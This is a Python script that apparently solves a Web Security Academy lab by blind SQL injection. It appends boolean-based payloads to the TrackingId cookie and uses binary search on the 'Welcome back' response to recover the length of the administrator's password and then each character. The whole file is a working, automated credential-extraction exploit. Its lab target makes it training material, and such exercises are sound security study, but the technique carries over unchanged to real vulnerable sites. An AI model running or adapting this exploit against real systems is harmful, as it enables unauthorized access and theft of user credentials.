#!/usr/bin/python3

import requests

LAB_URL = 'https://0a4e00ec03e1d8e082734d1c00930054.web-security-academy.net/'
WELCOME_TEXT = 'Welcome back'
TR_ID_NAME = 'TrackingId'
TRACKING_ID = 'ABKYiriquzzxlI8X'


def is_longer_than(i: int) -> bool:
	query = "' AND LENGTH((SELECT password FROM users WHERE username='administrator')) > {}--"
	cookies = {TR_ID_NAME: TRACKING_ID + query.format(i)}
	res = requests.get(LAB_URL, cookies=cookies)
	return WELCOME_TEXT in res.text


def determine_length() -> int:
	""" Determines the length of the password using binary search.
	Returns its length.
	"""
	print('*'*30)
	print('*** Password length ***')
	# left is always True, right is always False
	left = 0
	right = 40
	while left < right - 1:
		mid = (left + right) // 2
		print(f'Trying {mid}')
		if is_longer_than(mid):
			left = mid
		else:
			right = mid
	print(f'** Password length is {right}')
	return right
	

def is_letter_greater_than(i: int, ascii_val: int) -> bool:
	query = "' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'), {}, 1)) > {}--"
	cookies = {TR_ID_NAME: TRACKING_ID + query.format(i, ascii_val)}
	res = requests.get(LAB_URL, cookies=cookies)
	return WELCOME_TEXT in res.text

	
def get_letter(i: int) -> str:
	print(f'**For letter {i}:')
	left = 0
	right = 255
	while left < right - 1:
		mid = (left + right) // 2
		print(f'*Trying {mid}')
		if is_letter_greater_than(i, mid):
			left = mid
		else:
			right = mid
	val = chr(right)
	print(f'Found: {val}')
	return val
	
	
	
def get_password(pass_len: int) -> str:
	print('*'*30)
	print('*** Recovering the password ***')
	password = ''
	for i in range(1, pass_len+1):  # In SQL starts from 1.
		print(f'** Recovering letter {i}')
		password += get_letter(i)
		print(f'** Already have: {password}')
	print(f'*** The password is: {password} ***')
	return password
	

	
def try_query():
	"""Playground to try SQL queries for debugging.
	"""
	query = "' AND ASCII(SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1)) > 0--"
	cookies = {TR_ID_NAME: TRACKING_ID + query}
	res = requests.get(LAB_URL, cookies=cookies)
	if WELCOME_TEXT in res.text:
		print('-> Evaluates to True')
	else:
		print('-> Evaluates to False')


def main():
	cookies = {TR_ID_NAME: TRACKING_ID}
	res = requests.get(LAB_URL, cookies=cookies)
	assert WELCOME_TEXT in res.text
	print('Initial request OK')
	pass_len = determine_length()
	get_password(pass_len)


if __name__ == '__main__':
	main()
